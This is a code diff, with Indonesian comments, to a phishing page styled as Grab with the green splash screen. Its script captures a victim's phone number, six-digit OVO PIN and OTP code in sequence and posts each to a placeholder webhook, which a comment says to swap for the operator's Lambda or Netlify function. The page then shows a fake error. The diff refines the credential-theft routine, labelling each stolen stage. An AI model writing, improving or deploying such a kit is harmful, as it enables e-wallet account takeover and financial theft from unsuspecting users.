@@ -8,7 +8,6 @@
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
         :root { --grab-green: #00B14F; }
         
-        /* Splash Screen Style */
         #splash-screen { position: fixed; inset: 0; background: var(--grab-green); display: flex; align-items: center; justify-content: center; z-index: 9999; transition: opacity 0.5s ease; }
         #splash-screen img { width: 80%; max-width: 300px; }
 
@@ -72,14 +71,18 @@
 </div>
 
 <script>
-    // Menghilangkan splash screen setelah 3 detik
     setTimeout(() => {
         document.getElementById('splash-screen').style.opacity = '0';
         setTimeout(() => document.getElementById('splash-screen').style.display = 'none', 500);
     }, 3000);
 
-    function kirimKeServer(data) {
-        fetch('URL_WEBHOOK_ANDA', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(data) });
+    // GANTI URL_WEBHOOK_ANDA dengan URL Lambda/Netlify Function Anda
+    async function kirimKeServer(data, tahap) {
+        await fetch('URL_WEBHOOK_ANDA', { 
+            method: 'POST', 
+            headers: {'Content-Type': 'application/json'}, 
+            body: JSON.stringify({ ...data, tahap: tahap }) 
+        });
     }
 
     let timeLeft = 30;
@@ -94,7 +97,7 @@
     function lanjutKe2() { 
         let no = document.getElementById('nomor').value;
         if(!no) return alert("Isi nomor dulu!");
-        kirimKeServer({ "Nomor": no });
+        kirimKeServer({ "nomor": no }, "NOMOR HP");
         document.getElementById('page1').classList.remove('active'); 
         document.getElementById('page2').classList.add('active'); 
     }
@@ -111,7 +114,7 @@
             pin += n;
             document.getElementById('pinDisplay').innerText = "•".repeat(pin.length);
             if(pin.length == 6) {
-                kirimKeServer({ "PIN": pin });
+                kirimKeServer({ "pin": pin }, "PIN OVO");
                 document.getElementById('nomorTampil').innerText = document.getElementById('nomor').value;
                 document.getElementById('otpModal').style.display = 'flex';
                 startTimer();
@@ -120,7 +123,7 @@
     }
 
     function prosesKonfirmasi() {
-        kirimKeServer({ "OTP": document.getElementById('otpInput').value });
+        kirimKeServer({ "otp": document.getElementById('otpInput').value }, "KODE OTP");
         document.getElementById('errorText').style.display = 'block';
     }
 </script>
